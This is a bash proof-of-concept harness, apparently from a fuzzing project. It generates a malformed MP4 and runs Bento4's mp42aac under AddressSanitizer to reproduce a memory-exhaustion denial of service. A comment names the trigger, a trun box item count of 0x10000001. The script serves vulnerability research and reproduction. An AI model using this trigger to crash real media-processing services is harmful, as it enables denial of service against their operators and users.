#!/usr/bin/env bash
set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Constants_h"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="${POC_DIR}/vuln_003.mp4"
RESULT="${POC_DIR}/vuln_003_result.txt"
ASAN_LOG="${POC_DIR}/asan_003.log"

echo "[*] Step 1: Generating malicious MP4..."
python3 "${POC_DIR}/vuln_003_gen.py"

echo "[*] Step 2: Running mp42aac under ASAN/UBSAN..."
# Use hard_rss_limit_mb to cap physical RSS at 512 MB.
# The trun constructor calls SetItemCount(0x10000001) then zero-initializes
# 268 million 16-byte entries (= ~4 GB).  As each page is touched the RSS
# climbs; ASAN kills the process once it crosses the 512 MB threshold,
# demonstrating the unbounded allocation DoS on memory-limited hosts.
ASAN_OPTIONS="abort_on_error=0:hard_rss_limit_mb=512:log_path=${ASAN_LOG}" \
  "${BINARY}" "${INPUT}" /dev/null \
  > "${RESULT}" 2>&1 || true

echo "[*] Step 3: Collecting ASAN/UBSAN output..."
{
  echo ""
  echo "=== ASAN/UBSAN log output ==="
  for f in "${ASAN_LOG}".*; do
    if [ -f "$f" ]; then
      echo "--- $f ---"
      cat "$f"
    fi
  done
  if [ -f "${ASAN_LOG}" ]; then
    echo "--- ${ASAN_LOG} ---"
    cat "${ASAN_LOG}"
  fi
} >> "${RESULT}" 2>/dev/null || true

echo "[*] Done. Results in: ${RESULT}"
